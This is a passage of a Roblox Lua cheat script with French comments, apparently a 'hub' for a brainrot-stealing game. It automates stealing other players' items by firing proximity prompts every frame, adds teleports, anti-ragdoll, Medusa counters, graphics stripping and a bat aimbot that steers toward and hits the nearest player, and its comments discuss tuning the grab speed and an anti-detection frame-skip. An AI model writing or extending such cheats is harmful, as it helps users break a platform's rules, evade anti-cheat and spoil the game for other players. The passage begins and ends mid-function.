					if AutoSteal.ProgressText then AutoSteal.ProgressText.Text = math.floor(prog * 100) .. "%" end
					-- Rafraîchi en continu comme la source (RenderStepped y
					-- relit l'attribut StealingIndex à chaque frame — ici
					-- pareil, au même rythme que la barre de progression).
					if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text = _AG2_getBrainrotName(prompt) end
					task.wait()
				end
			end)
			task.wait(_AG2_CFG.HOLD_MIN)
			while true do
				if tick() - _AG2_startAt > _AG2_CFG.HOLD_MAX then break end
				if not prompt.Parent then break end
				local char = LP.Character
				local root = char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"))
				local parent = prompt.Parent
				if parent and parent:IsA("Attachment") then parent = parent.Parent end
				local dist = (root and parent and parent:IsA("BasePart")) and (parent.Position - root.Position).Magnitude or math.huge
				-- [CORRIGÉ] "vitesse de grab" — j'avais copié le task.wait(ENTRY_
				-- DELAY) du moteur V1 (0.3s de délai supplémentaire avant de
				-- tirer). La source, elle, ne fait JAMAIS ça : HalfEntryDelay
				-- est défini dans sa table Steal mais n'est référencé NULLE
				-- PART dans executeSteal() — le vol se déclenche immédiatement
				-- dès que getPromptDist(prompt) <= Steal.HalfFireRange, sans
				-- délai. Retiré : c'était 300ms artificiels par vol qui
				-- n'existent pas dans la source, exactement le genre d'écart
				-- qui faisait "ressembler à la V1".
				if dist <= _AG2_CFG.FIRE_RANGE then
					if data.useFire then pcall(fireproximityprompt, prompt)
					else for _, fn in ipairs(data.trigger) do task.spawn(fn) end end
					fired = true
					break
				end
				task.wait()
			end
		else
			-- Chemin simple de la source (Mode ~= "half") : attente fixe
			-- STEAL_DURATION puis déclenchement immédiat, sans vérif de
			-- distance — fidèle à l'else de executeSteal() dans la Logic
			-- collée.
			task.wait(_AG2_CFG.STEAL_DURATION)
			if prompt.Parent then
				if data.useFire then pcall(fireproximityprompt, prompt)
				else for _, fn in ipairs(data.trigger) do task.spawn(fn) end end
				fired = true
			end
		end
		-- [CORRIGÉ] "un poil trop rapide" — trouvé le vrai écart : dans la
		-- source, isStealing (mon _AG2_active) reste VRAI PENDANT le
		-- task.wait(0.05) final, et ne repasse à false qu'APRÈS (voir l'ordre
		-- exact : task.wait(0.05) → data.ready=true → isStealing=false).
		-- Comme startAutoSteal() n'attaque un nouveau vol que si isStealing
		-- est faux, ce court palier de 0.05s est un vrai temps mort GLOBAL
		-- entre deux vols dans la source. Je mettais _AG2_active à false
		-- AVANT ce wait — ce qui laissait le Heartbeat relancer un nouveau
		-- vol dès la frame suivante, sans respecter ce palier. Réordonné
		-- pour matcher exactement : le wait d'abord, _AG2_active/isStealing
		-- remis à false seulement après.
		if AutoSteal.ProgressFill then AutoSteal.ProgressFill.Size = UDim2.new(0,0,1,0) end
		if AutoSteal.ProgressText then AutoSteal.ProgressText.Text = "" end
		if fired and AutoSteal.FlashSuccess then AutoSteal.FlashSuccess() end
		task.wait(_AG2_CFG.COOLDOWN)
		data.ready = true
		-- Flags internes toujours remis à false, quelle que soit l'épreuve
		-- (jamais bloqués pour un futur redémarrage de V2).
		_AG2_active = false; State.isStealing = false
		-- [BUGFIX] "regarde qu'il y ait pas de bug en rebasculant en V1" —
		-- si ce vol V2 était encore en cours quand l'utilisateur a rebasculé
		-- vers V1 (_AG2_stopFn a changé l'épreuve entre temps), la barre
		-- partagée (StatusLabel/couleur) appartient maintenant à V1 — ne
		-- plus y toucher ici, sinon "Searching..." écraserait l'affichage
		-- READY/UNREADY de V1 juste après le switch.
		if myEpoch == _AG2_epoch then
			-- "Searching..." (comme la source à l'état idle), pas "READY" —
			-- toujours pour rester visuellement distinct de V1.
			if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text = "Searching..." end
			if AutoSteal.SetReadyColor then AutoSteal.SetReadyColor("READY") end
		end
	end)
end

_AG2_startFn = function()
	if _AG2_started then return end
	_AG2_started = true
	-- [DIAGNOSTIC] "le nouveau mode s'applique pas" — confirme en console
	-- que le moteur V2 a bien démarré (isole "le bouton ne bascule pas" de
	-- "le moteur tourne mais ne trouve/attrape rien").
	warn("[MH] Auto Grab V2 demarre (scan Workspace direct).")
	if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text = "Searching..." end
	if AutoSteal.SetReadyColor then AutoSteal.SetReadyColor("READY") end
	-- [CORRIGÉ] "je veux la même vitesse de grab que dans la source, tout"
	-- — j'avais ajouté un frame-skip (scan toutes les 1-3 frames au lieu
	-- de chaque frame) par précaution anti-détection, mais la source n'a
	-- RIEN de tel : son startAutoSteal() scanne à CHAQUE frame Heartbeat,
	-- sans throttle. Ce skip ralentissait réellement la vitesse à laquelle
	-- une nouvelle cible est détectée/attrapée par rapport à la source.
	-- Retiré : scan à chaque frame, fidèle à 100%.
	_AG2_conn = RunService.Heartbeat:Connect(function()
		if not AutoSteal.Enabled or _AG2_active then return end
		local p = _AG2_findNearest()
		if p then _AG2_execute(p) end
	end)
end
_AG2_stopFn = function()
	_AG2_started = false
	_AG2_epoch = _AG2_epoch + 1 -- invalide toute exécution _AG2_execute encore en vol
	if _AG2_conn then _AG2_conn:Disconnect(); _AG2_conn = nil end
	_AG2_active = false; State.isStealing = false
	if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text = "READY" end
end
end -- do..end AUTO GRAB méthode 2

-- ── Sélecteur de méthode ─────────────────────────────────────────────
-- "1" = moteur existant (Synchronizer live, plus précis/réactif) ; "2" =
-- scan Workspace direct (indépendant de Packages.Synchronizer). Jamais
-- les deux moteurs actifs ensemble : on stoppe l'un avant de lancer
-- l'autre, la barre (AutoSteal.*) reste la même dans les deux cas.
local _autoGrabMethod = 1
startAutoSteal = function()
	-- [DIAGNOSTIC] confirme en console quel moteur démarre réellement à
	-- chaque appel — vérifie que le choix V1/V2 est bien pris en compte.
	warn("[MH] startAutoSteal() -> methode "..tostring(_autoGrabMethod))
	if _autoGrabMethod == 2 then _AG2_startFn() else _AG1_start() end
end
stopAutoSteal = function()
	_AG1_stop(); _AG2_stopFn()
end
_GH.getAutoGrabMethod = function() return _autoGrabMethod end
_GH.setAutoGrabMethod = function(n)
	n = (n == 2) and 2 or 1
	if n == _autoGrabMethod then return end
	-- Redémarre proprement avec le nouveau moteur si l'auto steal tournait
	-- déjà — sinon on change juste la préférence, startAutoSteal() choisira
	-- le bon moteur au prochain démarrage.
	local running = (AutoSteal.Enabled == true)
	if running then stopAutoSteal() end
	_autoGrabMethod = n
	if running then startAutoSteal() end
end



-- ===================================================================
-- TP DOWN
-- ===================================================================
local function tpToGround()
	local char = LP.Character; if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
	local hum2 = char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
	-- Amir Hub logic: direct TP to fixed ground Y (-7.00), keeping Y rotation
	root.CFrame = CFrame.new(root.Position.X, -7.00, root.Position.Z)
		* CFrame.Angles(0, select(2, root.CFrame:ToEulerAnglesYXZ()), 0)
	root.AssemblyLinearVelocity = Vector3.zero
end

-- ===================================================================
-- DROP BRAINROT
-- ===================================================================
local _dropActive = false
local DROP_ASCEND_DURATION = 0.2
local DROP_ASCEND_SPEED    = 150

local function runDropBrainrot()
	if _dropActive then return end
	local char = LP.Character; if not char then return end
	local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
	_dropActive = true
	local t0 = tick()
	local dc
	dc = RunService.Heartbeat:Connect(function()
		-- Re-fetch LP.Character à chaque frame (comme Ace) : gère un respawn en plein drop
		local curChar = LP.Character
		local r = curChar and curChar:FindFirstChild("HumanoidRootPart")
		if not curChar or not r then dc:Disconnect(); _dropActive = false; return end
		if tick() - t0 >= DROP_ASCEND_DURATION then
			dc:Disconnect()
			-- Raycast to the ground
			local rp = RaycastParams.new()
			rp.FilterDescendantsInstances = {curChar}
			rp.FilterType = Enum.RaycastFilterType.Exclude
			local rr = workspace:Raycast(r.Position, Vector3.new(0, -2000, 0), rp)
			if rr then
				local hum2 = curChar:FindFirstChildOfClass("Humanoid")
				local off  = (hum2 and hum2.HipHeight or 2) + (r.Size.Y / 2)
				r.CFrame = CFrame.new(r.Position.X, rr.Position.Y + off, r.Position.Z)
				r.AssemblyLinearVelocity  = Vector3.zero
				r.AssemblyAngularVelocity = Vector3.zero
			end
			_dropActive = false
			return
		end
		-- Fast ascent phase
		r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, DROP_ASCEND_SPEED, r.AssemblyLinearVelocity.Z)
	end)
end

-- ===================================================================
-- AUTO LEFT / RIGHT  (logique Taser Hub — 2 phases + orientation finale)
-- ===================================================================
local AP_L1     = Vector3.new(-476.48, -6.28, 92.73)
local AP_L2     = Vector3.new(-483.12, -4.95, 94.80)
local AP_L_FACE = Vector3.new(-482.25, -4.96, 92.09)
local AP_R1     = Vector3.new(-476.16, -6.52, 25.62)
local AP_R2     = Vector3.new(-483.06, -5.03, 25.48)
local AP_R_FACE = Vector3.new(-482.06, -6.93, 35.47)

local alConn, arConn = nil, nil
local alPhase, arPhase = 1, 1

local function stopAutoLeft()
	if alConn then alConn:Disconnect(); alConn = nil end
	alPhase = 1; proxyStop(); State.autoLeftEnabled = false
end

local function stopAutoRight()
	if arConn then arConn:Disconnect(); arConn = nil end
	arPhase = 1; proxyStop(); State.autoRightEnabled = false
end

local function startAutoLeft()
	if _GH.SM_tryStart and not _GH.SM_tryStart() then return end
	if State.autoRightEnabled then stopAutoRight() end
	if alConn then alConn:Disconnect() end
	alPhase = 1; State.autoLeftEnabled = true
	alConn = RunService.Heartbeat:Connect(function()
		if not State.autoLeftEnabled then return end
		local char = LP.Character; if not char then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp or not hum then return end
		local st = hum:GetState()
		if hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then hum:Move(Vector3.zero,false); return end
		local spd = State.normalSpeed
		if alPhase == 1 then
			if (Vector3.new(AP_L1.X, hrp.Position.Y, AP_L1.Z) - hrp.Position).Magnitude < 1 then
				alPhase = 2
			end
			local d = AP_L1 - hrp.Position
			proxyMove(Vector3.new(d.X, 0, d.Z).Unit, spd)
		elseif alPhase == 2 then
			if (Vector3.new(AP_L2.X, hrp.Position.Y, AP_L2.Z) - hrp.Position).Magnitude < 1 then
				proxyStop(); State.autoLeftEnabled = false
				if alConn then alConn:Disconnect(); alConn = nil end
				alPhase = 1
				hrp.CFrame = CFrame.new(hrp.Position, Vector3.new(AP_L_FACE.X, hrp.Position.Y, AP_L_FACE.Z))
				return
			end
			local d = AP_L2 - hrp.Position
			proxyMove(Vector3.new(d.X, 0, d.Z).Unit, spd)
		end
	end)
end

local function startAutoRight()
	if _GH.SM_tryStart and not _GH.SM_tryStart() then return end
	if State.autoLeftEnabled then stopAutoLeft() end
	if arConn then arConn:Disconnect() end
	arPhase = 1; State.autoRightEnabled = true
	arConn = RunService.Heartbeat:Connect(function()
		if not State.autoRightEnabled then return end
		local char = LP.Character; if not char then return end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not hrp or not hum then return end
		local st = hum:GetState()
		if hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown then hum:Move(Vector3.zero,false); return end
		local spd = State.normalSpeed
		if arPhase == 1 then
			if (Vector3.new(AP_R1.X, hrp.Position.Y, AP_R1.Z) - hrp.Position).Magnitude < 1 then
				arPhase = 2
			end
			local d = AP_R1 - hrp.Position
			proxyMove(Vector3.new(d.X, 0, d.Z).Unit, spd)
		elseif arPhase == 2 then
			if (Vector3.new(AP_R2.X, hrp.Position.Y, AP_R2.Z) - hrp.Position).Magnitude < 1 then
				proxyStop(); State.autoRightEnabled = false
				if arConn then arConn:Disconnect(); arConn = nil end
				arPhase = 1
				hrp.CFrame = CFrame.new(hrp.Position, Vector3.new(AP_R_FACE.X, hrp.Position.Y, AP_R_FACE.Z))
				return
			end
			local d = AP_R2 - hrp.Position
			proxyMove(Vector3.new(d.X, 0, d.Z).Unit, spd)
		end
	end)
end

-- ===================================================================
-- ANTI RAGDOLL
-- ===================================================================
-- Copie exacte de la logique Ace Duels (startAntiRagdoll/stopAntiRagdoll/
-- setAntiRagdoll) : state Physics/Ragdoll/FallingDown + attribut
-- RagdollEndTime, destroy BallSocketConstraint/RagdollAttachment,
-- re-enable Motor6D, unanchor + zero velocity. Ancienne logique
-- (JumpPower/WalkSpeed/CanCollide/ControlModule/Dead/PlatformStand/Sit)
-- supprimée — Ace ne fait rien de tout ça.
local antiRagdollConn = nil

local function startAntiRagdoll()
	if antiRagdollConn then return end
	antiRagdollConn = RunService.Heartbeat:Connect(_ncc(function()
		if not State.antiRagdollEnabled then return end
		local char = LP.Character
		if not char then return end
		local hum = char:FindFirstChildOfClass("Humanoid")
		local root = char:FindFirstChild("HumanoidRootPart")
		if not (hum and root) then return end
		local s = hum:GetState()
		local ragdolled = (
			s == Enum.HumanoidStateType.Physics
			or s == Enum.HumanoidStateType.Ragdoll
			or s == Enum.HumanoidStateType.FallingDown
		)
		local endTime = LP:GetAttribute("RagdollEndTime")
		if endTime and (endTime - workspace:GetServerTimeNow()) > 0 then
			ragdolled = true
		end
		if ragdolled then
			pcall(function()
				LP:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
			end)
			for _, d in ipairs(char:GetDescendants()) do
				if d:IsA("BallSocketConstraint") or (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
					pcall(function() d:Destroy() end)
				end
			end
			for _, obj in ipairs(char:GetDescendants()) do
				if obj:IsA("Motor6D") and obj.Enabled == false then
					obj.Enabled = true
				end
			end
			if hum.Health > 0 then
				hum:ChangeState(Enum.HumanoidStateType.Running)
			end
			workspace.CurrentCamera.CameraSubject = hum
			root.Anchored = false
			root.AssemblyLinearVelocity = Vector3.zero
			root.AssemblyAngularVelocity = Vector3.zero
		end
	end))  -- _ncc close
end

local function stopAntiRagdoll()
	if antiRagdollConn then
		antiRagdollConn:Disconnect()
		antiRagdollConn = nil
	end
end

LP.CharacterAdded:Connect(function()
	task.wait(0.5)
	if State.antiRagdollEnabled then startAntiRagdoll() end
end)

-- ===================================================================
-- UNWALK
-- ===================================================================
local savedAnimate = nil
local function startUnwalk()
	if State.unwalkEnabled then return end; State.unwalkEnabled = true
	local c=LP.Character; if not c then return end
	local hum=c:FindFirstChildOfClass("Humanoid")
	if hum then for _,t in ipairs(hum:GetPlayingAnimationTracks()) do t:Stop() end end
	local anim=c:FindFirstChild("Animate"); if anim then savedAnimate=anim:Clone(); anim:Destroy() end
end
local function stopUnwalk()
	if not State.unwalkEnabled then return end; State.unwalkEnabled=false
	local c=LP.Character
	if c and savedAnimate then savedAnimate.Parent=c; savedAnimate.Disabled=false; savedAnimate=nil end
end
-- Restart Unwalk after every respawn if active
LP.CharacterAdded:Connect(function(char)
	if State.unwalkEnabled then
		State.unwalkEnabled = false  -- reset so startUnwalk accepts
		savedAnimate = nil
		task.wait(0.5)               -- laisser le character se charger
		startUnwalk()
	end
end)

-- ===================================================================
-- AUTO CARRY ON GRAB
-- ===================================================================
local lastCarryDetected = false
RunService.Heartbeat:Connect(function()
	if not State.autoCarryOnGrab then return end
	if State.laggerActive or State.laggerCarryActive then return end
	if tick() < (State._carryManualUntil or 0) then return end
	local hum=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid"); if not hum then return end
	local carrying = (hum.WalkSpeed < 25)  -- [FIX #6] aligné sur updateCarryState (< 25)
	if carrying==lastCarryDetected then return end
	lastCarryDetected=carrying; State.speedType=carrying and "carry" or "normal"
end)

-- ===================================================================
-- OPTIMIZE MODULE
-- ===================================================================
local NukeOpt = {active=false, conns={}, threads={}}
local function nukeOptStart()
	if NukeOpt.active then return end; NukeOpt.active=true
	-- [FIX Perf #1] Lookup O(1) par ClassName au lieu de O(12) par itération de liste.
	-- Ces types n'ont pas de sous-classes Roblox, donc ClassName est équivalent à IsA.
	local ClothingSet = {
		Shirt=true, Pants=true, ShirtGraphic=true, Accessory=true, Hat=true,
		HairAccessory=true, FaceAccessory=true, NeckAccessory=true,
		ShoulderAccessory=true, FrontAccessory=true, BackAccessory=true, WaistAccessory=true,
	}
	local function IsClothing(obj) return ClothingSet[obj.ClassName] == true end
	-- [FIX #3] Cache des Character (O(1) par test) plutôt que GetPlayers() à chaque objet.
	local _charSet = {}
	local function _rebuildCharSet()
		_charSet = {}
		for _, p in ipairs(Players:GetPlayers()) do
			if p.Character then _charSet[p.Character] = true end
		end
	end
	_rebuildCharSet()
	Players.PlayerAdded:Connect(function(p)
		p.CharacterAdded:Connect(function(c) _charSet[c] = true end)
		p.CharacterRemoving:Connect(function(c) _charSet[c] = nil end)
	end)
	for _, p in ipairs(Players:GetPlayers()) do
		p.CharacterAdded:Connect(function(c) _charSet[c] = true end)
		p.CharacterRemoving:Connect(function(c) _charSet[c] = nil end)
	end
	local function IsCharacterPart(obj)
		local cur = obj.Parent
		while cur do
			if _charSet[cur] then return true end
			cur = cur.Parent
		end
		return false
	end
	local function SafeDestroy(obj) if obj.Name~="Overhead" then pcall(function() obj:Destroy() end) end end
	local function CleanObject(obj)
		pcall(function()
			if obj:IsA("SurfaceAppearance") or obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam")
				or obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight")
				or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Explosion") then
				SafeDestroy(obj)
			elseif obj:IsA("Decal") or obj:IsA("Texture") then
				if not (obj.Name=="face" and obj.Parent and obj.Parent.Name=="Head") then SafeDestroy(obj) end
			elseif obj:IsA("BasePart") then obj.CastShadow=false; obj.Material=Enum.Material.Plastic; obj.Reflectance=0 end
		end)
	end
	Lighting.GlobalShadows=false; Lighting.FogEnd=9e9; Lighting.EnvironmentDiffuseScale=0; Lighting.EnvironmentSpecularScale=0
	for _,v in ipairs(Lighting:GetChildren()) do
		if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") then v:Destroy() end
	end
	table.insert(NukeOpt.threads, task.spawn(function()
		for _,obj in ipairs(workspace:GetDescendants()) do
			if not NukeOpt.active then return end
			if not IsCharacterPart(obj) then if IsClothing(obj) then SafeDestroy(obj) else CleanObject(obj) end end
		end
	end))
	table.insert(NukeOpt.conns, workspace.DescendantAdded:Connect(function(obj)
		if not NukeOpt.active then return end
		task.defer(function()
			if not NukeOpt.active then return end
			if not IsCharacterPart(obj) then if IsClothing(obj) then SafeDestroy(obj) else CleanObject(obj) end end
		end)
	end))
end
local function nukeOptStop()
	NukeOpt.active=false
	for _,c in ipairs(NukeOpt.conns) do pcall(function() c:Disconnect() end) end; NukeOpt.conns={}
	-- [FIX B7] NukeOpt.threads n'était jamais nettoyé → fuite mémoire sur cycles ON/OFF répétés
	for _,t in ipairs(NukeOpt.threads) do pcall(function() task.cancel(t) end) end; NukeOpt.threads={}
end

local RemoveAcc = {active=false, conn=nil, removed=setmetatable({},{__mode="k"})}
local function removeAccDo()
	if not RemoveAcc.active then return end; local char=LP.Character; if not char then return end
	for _,obj in ipairs(char:GetDescendants()) do
		if (obj:IsA("Accessory") or obj:IsA("Hat")) and not RemoveAcc.removed[obj] then
			RemoveAcc.removed[obj]=true; pcall(function() obj:Destroy() end)
		end
	end
end
local function removeAccStart()
	if RemoveAcc.active then return end; RemoveAcc.active=true; removeAccDo()
	RemoveAcc.conn=LP.CharacterAdded:Connect(function() task.wait(0.5); if RemoveAcc.active then removeAccDo() end end)
end
local function removeAccStop()
	RemoveAcc.active=false; if RemoveAcc.conn then RemoveAcc.conn:Disconnect(); RemoveAcc.conn=nil end
end

local function cleanParticlesAndLights()
	local removed=0
	for _,obj in ipairs(workspace:GetDescendants()) do
		if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire")
			or obj:IsA("Smoke") or obj:IsA("Sparkles") or obj:IsA("Explosion")
			or obj:IsA("PointLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
			pcall(function() obj:Destroy() end); removed=removed+1
		end
	end; return removed
end

local AntiLagAdv = {active=false, conn=nil}
local function _applyAntiLagAdvObj(obj)
	pcall(function()
		if obj:IsA("BasePart") then obj.Material=Enum.Material.Plastic; obj.Reflectance=0; obj.CastShadow=false
		elseif obj:IsA("Decal") or obj:IsA("Texture") then obj.Transparency=1
		elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") then obj.Enabled=false end
	end)
end
local function antiLagAdvStart()
	if AntiLagAdv.active then return end; AntiLagAdv.active=true; Lighting.GlobalShadows=false
	for _,obj in ipairs(workspace:GetDescendants()) do _applyAntiLagAdvObj(obj) end
	AntiLagAdv.conn=workspace.DescendantAdded:Connect(function(obj) if AntiLagAdv.active then _applyAntiLagAdvObj(obj) end end)
end
local function antiLagAdvStop()
	AntiLagAdv.active=false; if AntiLagAdv.conn then AntiLagAdv.conn:Disconnect(); AntiLagAdv.conn=nil end
end

-- ===================================================================
-- ===================================================================
-- MEDUSA COUNTER (logique raw__59_)
-- MEDUSA COUNTER (raw__59_ logic)
-- Copie exacte de la logique Ace Duels : cooldown 25s (pas 0.5s),
-- check State.medusaCounterEnabled dans useMedusaCounter lui-même,
-- wait 0.05s après l'équip avant d'activer.
local _medLastUsed = 0
local _medDebounce = false
local _medConns = {}
local _MED_COOLDOWN = 25

local function findMedusa()
	local char=LP.Character; if not char then return nil end
	for _,tool in ipairs(char:GetChildren()) do
		if tool:IsA("Tool") then local tn=tool.Name:lower()
			if tn:find("medusa") or tn:find("head") or tn:find("stone") then return tool end
		end
	end
	local bp2=LP:FindFirstChild("Backpack") or LP:FindFirstChildOfClass("Backpack")
	if bp2 then
		for _,tool in ipairs(bp2:GetChildren()) do
			if tool:IsA("Tool") then local tn=tool.Name:lower()
				if tn:find("medusa") or tn:find("head") or tn:find("stone") then return tool end
			end
		end
	end
	return nil
end

local function useMedusaCounter()
	if not State.medusaCounterEnabled then return end
	if _medDebounce then return end
	if tick()-_medLastUsed < _MED_COOLDOWN then return end
	local char=LP.Character; if not char then return end
	_medDebounce=true
	local med=findMedusa(); if not med then _medDebounce=false; return end
	if med.Parent~=char then
		local hum2=char:FindFirstChildOfClass("Humanoid"); if hum2 then pcall(function() hum2:EquipTool(med) end) end
		task.wait(0.05)
	end
	pcall(function() med:Activate() end)
	_medLastUsed=tick(); _medDebounce=false
end

local function setupMedusaCounter(char)
	for _,c in pairs(_medConns) do pcall(function() c:Disconnect() end) end; _medConns={}
	if not char then return end
	local function watchPart(part)
		table.insert(_medConns, part:GetPropertyChangedSignal("Anchored"):Connect(function()
			if part.Anchored and part.Transparency==1 then useMedusaCounter() end
		end))
	end
	for _,part in ipairs(char:GetDescendants()) do if part:IsA("BasePart") then watchPart(part) end end
	table.insert(_medConns, char.DescendantAdded:Connect(function(part)
		if part:IsA("BasePart") then watchPart(part) end
	end))
end
local function stopMedusaCounter()
	for _,c in pairs(_medConns) do pcall(function() c:Disconnect() end) end; _medConns={}
end

LP.CharacterAdded:Connect(function(char) if State.medusaCounterEnabled then task.wait(0.5); setupMedusaCounter(char) end end)

-- ===================================================================
-- AUTO RESET MEDUSA (Taser Hub — PlatformStand + Anchored detect)
-- ===================================================================
-- Copie exacte de la logique Ace Duels (AceAutoResetShouldFire/FireOnce/
-- OnAnchorChanged/Start/Stop) : détecte uniquement Anchored+Transparent
-- (signature freeze Medusa), exclut les parts d'un Tool/Accessory,
-- cooldown 2.25s + debounce medTriggered + délai 2.3s avant le reset.
-- L'ancienne détection PlatformStand (absente chez Ace, faux positifs
-- sur tout ragdoll normal) est supprimée.
local _armState = {
	conns = {}, enabled = false, medTriggered = false,
	lastFire = 0, cooldown = 2.25,
}

local function _armShouldFire(part)
	if not _armState.enabled then return false end
	if _armState.medTriggered then return false end
	if tick() - (_armState.lastFire or 0) < _armState.cooldown then return false end
	if not part or not part.Parent then return false end
	if part:FindFirstAncestorOfClass("Tool") or part:FindFirstAncestorOfClass("Accessory") then
		return false
	end
	return part.Anchored and part.Transparency == 1
end

local function _armFireOnce(part)
	if not _armShouldFire(part) then return end
	_armState.medTriggered = true
	_armState.lastFire = tick()
	task.delay(2.3, function()
		if _armState.enabled and _GH.MH_instareset then
			pcall(_GH.MH_instareset)
		end
		-- [FIX #5] Remet medTriggered à false après exécution :
		-- permet un second auto-reset dans la même vie si Médusa refrappe.
		-- Le cooldown (_armState.cooldown = 2.25s) empêche les spams.
		_armState.medTriggered = false
	end)
end

local function _armWatchPart(part)
	return part:GetPropertyChangedSignal("Anchored"):Connect(function()
		_armFireOnce(part)
	end)
end

local function setupAutoResetMedusa(char)
	for _, c in pairs(_armState.conns) do pcall(function() c:Disconnect() end) end
	_armState.conns = {}
	_armState.medTriggered = false
	if not char then return end
	for _, part in ipairs(char:GetDescendants()) do
		if part:IsA("BasePart") then
			table.insert(_armState.conns, _armWatchPart(part))
			_armFireOnce(part)
		end
	end
	table.insert(_armState.conns, char.DescendantAdded:Connect(function(part)
		if part:IsA("BasePart") then
			table.insert(_armState.conns, _armWatchPart(part))
			_armFireOnce(part)
		end
	end))
end

local function stopAutoResetMedusa()
	for _, c in pairs(_armState.conns) do pcall(function() c:Disconnect() end) end
	_armState.conns = {}
	_armState.medTriggered = false
end

LP.CharacterAdded:Connect(function(char)
	task.wait(0.5); if _armState.enabled then setupAutoResetMedusa(char) end
end)


-- ===================================================================
-- BAT AIMBOT + AIM BYPASS (logique raw__59_)
-- BAT AIMBOT + AIM BYPASS (raw__59_ logic)
local VYSE_HIT_DIST = 5
local AB_SPEED      = 58
local AB_HIT_CD     = false

local BAT_NAMES = {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}

local function getBat()
	local c=LP.Character; if not c then return nil end
	for _,name in ipairs(BAT_NAMES) do local t=c:FindFirstChild(name); if t and t:IsA("Tool") then return t end end
	local bp=LP:FindFirstChildOfClass("Backpack"); if bp then
		for _,name in ipairs(BAT_NAMES) do local t=bp:FindFirstChild(name); if t then return t end end
	end
end

local function tryHitBat()
	if AB_HIT_CD then return end; AB_HIT_CD=true
	pcall(function()
		local bat=getBat(); if not bat then return end
		local c=LP.Character; local hum2=c and c:FindFirstChildOfClass("Humanoid")
		if bat.Parent~=c and hum2 then pcall(function() hum2:EquipTool(bat) end) end
		pcall(function() bat:Activate() end)
	end)
	task.delay(0.2, function() AB_HIT_CD=false end)
end

local function getClosestPlayerAim()
	local root=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart"); if not root then return nil,math.huge end
	local closest,minDist=nil,math.huge
	for _,plr in ipairs(Players:GetPlayers()) do
		if plr~=LP and plr.Character then
			local tr=plr.Character:FindFirstChild("HumanoidRootPart"); local hum2=plr.Character:FindFirstChildOfClass("Humanoid")
			if tr and hum2 and hum2.Health>0 then
				local d=(tr.Position-root.Position).Magnitude; if d<minDist then minDist=d; closest=plr end
			end
		end
	end
	return closest,minDist
end

	-- Aimbot (prediction + 0.8 lerp)
local AB = {active=false, conn=nil, SPEED=AB_SPEED, HEIGHT=3.7}
function AB.start()
	if _GH.SM_tryStart and not _GH.SM_tryStart() then return end
	AB.active=true
	if AB.conn then AB.conn:Disconnect() end
	local hum0=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
	if hum0 then hum0.AutoRotate=false end
	AB.conn=RunService.RenderStepped:Connect(function()
		if not AB.active then return end
		local char=LP.Character; if not char then return end
		local root=char:FindFirstChild("HumanoidRootPart"); if not root then return end
		local hum=char:FindFirstChildOfClass("Humanoid"); if not hum then return end
		if not char:FindFirstChildOfClass("Tool") then local bat=getBat(); if bat then pcall(function() hum:EquipTool(bat) end) end end
		local target,dist=getClosestPlayerAim()
		if not target or not target.Character then return end
		local tr=target.Character:FindFirstChild("HumanoidRootPart"); if not tr then return end
		local targetVel=tr.AssemblyLinearVelocity
		local myPos=root.Position; local targetPos=tr.Position
		local predictPos=targetPos+targetVel*0.14+tr.CFrame.LookVector*0.3
		local direction=predictPos-myPos; local flatDir=Vector3.new(direction.X,0,direction.Z).Unit
		local desiredHeight=targetPos.Y+AB.HEIGHT
		local yVel=(desiredHeight-myPos.Y)*19.5+targetVel.Y*0.8
		if hum.FloorMaterial~=Enum.Material.Air then yVel=math.max(yVel,13) end
		yVel=math.clamp(yVel,-70,110)
		local desiredVel=Vector3.new(flatDir.X*AB.SPEED,yVel,flatDir.Z*AB.SPEED)
		root.AssemblyLinearVelocity=root.AssemblyLinearVelocity:Lerp(desiredVel,0.8)
		local speed3=targetVel.Magnitude; local predictTime=math.clamp(speed3/150,0.05,0.2)
		local predictedPos=targetPos+targetVel*predictTime; local toPredict=predictedPos-myPos
		if toPredict.Magnitude>0.1 then
			local goalCF=CFrame.lookAt(myPos,predictedPos); local diffCF=root.CFrame:Inverse()*goalCF
			local rx,ry,rz=diffCF:ToEulerAnglesXYZ()
			rx=math.clamp(rx,-2.5,2.5); ry=math.clamp(ry,-2.5,2.5); rz=math.clamp(rz,-2.5,2.5)
			root.AssemblyAngularVelocity=root.CFrame:VectorToWorldSpace(Vector3.new(rx*42,ry*42,rz*42))
		end
		if dist<=VYSE_HIT_DIST then tryHitBat() end
	end)
end
function AB.stop()
	AB.active=false; if AB.conn then AB.conn:Disconnect(); AB.conn=nil end
	AB_HIT_CD=false
